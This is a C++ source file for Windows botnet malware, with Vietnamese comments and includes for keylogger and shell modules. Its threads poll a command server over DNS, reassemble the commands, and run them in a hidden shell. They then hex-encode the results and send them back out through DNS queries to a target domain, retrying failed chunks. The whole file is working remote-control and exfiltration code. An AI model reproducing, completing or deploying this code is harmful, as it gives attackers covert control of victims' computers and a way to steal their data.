#include "Botnet.h"
#include "KeyLogger.h"
#include "Network.h"
#include "ConsoleClient.h"
#include "Shell.h"
#include <string>

void EnqueueSend(const std::string& s) {
    std::lock_guard<std::mutex> lk(queue_mutex);
    send_queue.push(s);
}

void EnqueueExecute(const std::string& s) {
    std::lock_guard<std::mutex> lk(execute_mutex);
    execute_queue.push(s);
}

DWORD senderBotnetThread(LPVOID lpParam)
{
    while (true) {
        // Buoc 1: Poll lay command chunks tu server
        std::vector<std::string> command_chunks;
        size_t chunk_offset = 0;

        while (true)
        {
            // Gui Type P packet de poll chunk tiep theo
            int retcode = sendDataTypeP(connectionId, packetNumber, chunk_offset, TARGET_DOMAIN.c_str());

            if (retcode == 1) {
                // Nhan thanh cong mot chunk
                std::string chunk_data;
                {
                    std::lock_guard<std::mutex> lock(g_outChunkMutex);

                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, g_outChunk.c_str(), -1, nullptr, 0, nullptr, nullptr);
                    if (size_needed > 0) {
                        std::string temp(size_needed - 1, 0);
                        WideCharToMultiByte(CP_UTF8, 0, g_outChunk.c_str(), -1, &temp[0], size_needed, nullptr, nullptr);
                        chunk_data = temp;
                    }
                }

                if (!chunk_data.empty()) {
                    command_chunks.push_back(chunk_data);
                    chunk_offset++;
                    Sleep(50); // Delay nho giua cac chunk request
                } else {
                    break;
                }
            } 
            else if (retcode == 0) {
                // Khong con chunk nao (empty response hoac het lenh)
                break;
            } 
            else {
                // Xay ra loi (retcode == -1)
                break;
            }
        }

        // Buoc 2: Kiem tra neu co lenh de xu ly
        std::string dataToSend;

        if (!command_chunks.empty()) {
            // Ghep lai lenh day du tu cac chunks
            std::string full_command;
            for (const auto& chunk : command_chunks) {
                full_command += chunk;
            }

            // Dua lenh vao queue de thuc thi
            EnqueueExecute(full_command);
        }

        // Buoc 3: Kiem tra queue co du lieu de gui lai
        {
            std::lock_guard<std::mutex> lock(queue_mutex);
            if (!send_queue.empty()) {
                dataToSend = send_queue.front();
                send_queue.pop();
            }
        }

        // Buoc 4: Gui du lieu tro lai server theo chunks
        if (!dataToSend.empty()) {
            // Chia dataToSend thanh cac chunks voi kich thuoc max_len
            size_t offset = 0;
            size_t offset_number = 0;
            const size_t totalLen = dataToSend.size();
            int consecutiveFailures = 0;
            const int MAX_FAILURES = 3;
            
            while (offset < totalLen) {
                size_t chunkLen = std::min<size_t>(max_len, totalLen - offset);
                std::string chunk = dataToSend.substr(offset, chunkLen);
                offset_number = offset / max_len;
                
                // Chuyen chunk sang hex cho DNS transmission
                std::string chunkHex = convertToHex(chunk.c_str());
                
                int success = sendDataTypeC(connectionId, packetNumber, offset_number,
                                            TARGET_DOMAIN.c_str(), chunkHex.c_str());

                if (success == 0) {
                    // Gui thanh cong -> tang packet number
                    packetNumber++;
                    if (packetNumber > 999) {
                        packetNumber = 0;
                    }

                    offset += chunkLen;
                    consecutiveFailures = 0;
                    Sleep(50);
                } else {
                    consecutiveFailures++;
                    
                    if (consecutiveFailures >= MAX_FAILURES) {
                        // Bo qua packet that bai va chuyen sang chunk tiep theo
                        packetNumber++;
                        if (packetNumber > 999) {
                            packetNumber = 0;
                        }
                        offset += chunkLen;
                        consecutiveFailures = 0;
                        Sleep(100);
                    } else {
                        // Cho va thu lai
                        Sleep(500);
                    }
                }
            }
        } else {
            // Khong co du lieu gui, cho mot chut truoc chu ky tiep theo
            Sleep(2000);
        }
    }
    return 0;
}

DWORD handle_botnet(LPVOID lpParam)
{
    ConsoleClient client;
    Shell shell(&client);

    if (!shell.CreateSession()) {
        return 1;
    }

    while (true) {
        std::string commandToExecute;


        {
            std::lock_guard<std::mutex> lock(execute_mutex);
            if (!execute_queue.empty()) {
                commandToExecute = execute_queue.front();
                execute_queue.pop();
            }
        }


        if (!commandToExecute.empty()) {
            shell.ExecuteCommand(commandToExecute);
            // Output will be automatically sent via ConsoleClient::Send -> EnqueueSend
        } else {
            // No command to execute, wait briefly
            Sleep(100);
        }
    }

    // Cleanup (unreachable in infinite loop, but kept for completeness)
    shell.Dispose();
    return 0;
}